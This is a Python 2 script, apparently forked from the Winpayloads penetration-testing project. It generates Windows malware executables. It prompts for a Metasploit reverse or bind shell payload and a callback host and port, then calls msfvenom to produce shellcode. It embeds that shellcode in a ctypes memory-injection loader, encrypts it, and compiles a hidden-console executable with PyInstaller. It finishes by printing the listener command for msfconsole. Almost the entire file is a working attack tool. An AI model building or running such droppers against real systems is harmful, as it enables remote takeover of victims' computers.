#!/usr/bin/python

# FORKED BY: 		https://github.com/nccgroup/Winpayloads
# DIRECTORY: 		lib/generatepayload.py
# FORK DATE: 		18.09.2017
# COMMIT:			53cef1c  on 15 Aug 53cef1c66249349006748ccd4e0cd3612899552a

import random
import subprocess
import sys

from encrypt import *

############################################################################################################
# CODE TAKEN BY: 	lib/main.py
# COMMIT: 			bb843dc on 12 Set (bb843dc161c1c5e3f9b830ca32dac32d92c45eb6)

import socket

injectwindows = """shellcode = bytearray('%s')
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
"""

def CheckInternet():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 0))
        IP = s.getsockname()[0]
        return IP
    except:
        return "0.0.0.0"
############################################################################################################


def payloaddir():
	#return os.path.expanduser('~') + '/winpayloads'
	return 'payload/'

def CleanUpPayloadMess(payloadname):
	os.system('rm dist -r')
	os.system('rm build -r')
	os.system('rm *.spec')
	os.system('rm %s/payload.py' % payloaddir())


def GeneratePayload(ez2read_shellcode,payloadname,shellcode):
	print ez2read_shellcode
	with open('%s/payload.py' % payloaddir(), 'w+') as Filesave:
		Filesave.write(do_Encryption_v2(injectwindows % (ez2read_shellcode)))
		Filesave.close()
	print '[*] Creating Payload using Pyinstaller...'

	randomenckey = ''.join(random.sample(string.ascii_lowercase, 16))

	subprocess.call (['wine', os.path.expanduser('~') + '/.wine/drive_c/Python27/python.exe', '/opt/pyinstaller/pyinstaller.py',
						  '%s/payload.py' % payloaddir(), '--noconsole', '--onefile', '--key',randomenckey], bufsize=1024,)

	os.system('mv dist/payload.exe %s/%s.exe'% (payloaddir(),payloadname))

	print '\n###################################################################'
	print '[*] Payload.exe Has Been Generated And Is Located Here: %s/%s.exe' % (payloaddir(), payloadname)
	
	CleanUpPayloadMess(payloadname)

###################################################################################################################

import os
try: os.mkdir (payloaddir())
except: pass

payload_list = [ 'windows/shell/reverse_tcp', 'windows/meterpreter/bind_tcp', 'windows/meterpreter/reverse_tcp']

SHELLCODE_OUT_FILE = payloaddir() + 'hex_shellcode.txt'
PAYLOAD = ''
RHOST = ''
LPORT = ''


print "[*] Available payloads: "
for p in payload_list:
			print "\t" + str(payload_list.index(p)) + ") " + p
print "\n"
while not PAYLOAD:
	try:
		PAYLOAD = payload_list[input ("[?] PAYLOAD: ")]
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not RHOST:
	try:
		RHOST = raw_input ('\n[?] RHOST (' + CheckInternet() + '): ')
		if not RHOST: RHOST = CheckInternet()
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


while not LPORT:
	try:
		LPORT = raw_input ("\n[?] LPORT (4444): ")
		if not LPORT: LPORT = "4444"
	except KeyboardInterrupt:
		sys.exit(-1)
	except:
		pass


print "\n\n[*] Configuration:"
print "    - PAYLOAD: " + PAYLOAD
print "    - RHOST:   " + RHOST
print "    - LPORT:   " + LPORT
print "\n"



try:
	if raw_input ("[?] Ready [y/n]? ") == "y":


		# Writing shellcode to file
		f = open( SHELLCODE_OUT_FILE , "w")
		subprocess.call (['msfvenom', '-p', PAYLOAD , 'RHOST=' + RHOST, 'LPORT=' + LPORT,
									'-f', 'hex',], bufsize=1024, stdout=f)
		f.close()


		# Reading shellcode to file
		f = open( SHELLCODE_OUT_FILE , "r")
		buf = f.read()
		f.close()


		# Converting shellcode HEX notation
		t = iter(buf)
		ez2read_shellcode = "\\x" + "\\x".join(a+b for a,b in zip(t, t))


		#ez2read_shellcode = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in buf)		# For -f python
		#print len(ez2read_shellcode)
		#print ez2read_shellcode


		OUT_NAME = PAYLOAD.replace('/', '-')
		GeneratePayload (ez2read_shellcode, OUT_NAME, None)

		try: 
			os.remove (SHELLCODE_OUT_FILE)
			os.remove ('*.pyc')
		except: 
			pass

		print "\n\n[*] Run metasploit: "
		print "msfconsole -x \'use exploit/multi/handler; set LHOST 0.0.0.0; set LPORT " + LPORT + "; run\'"

	else:
		print "[*] Gracefully quitting..."
		sys.exit(0)
except:
	print "[*] Gracefully quitting..."
	sys.exit(0)
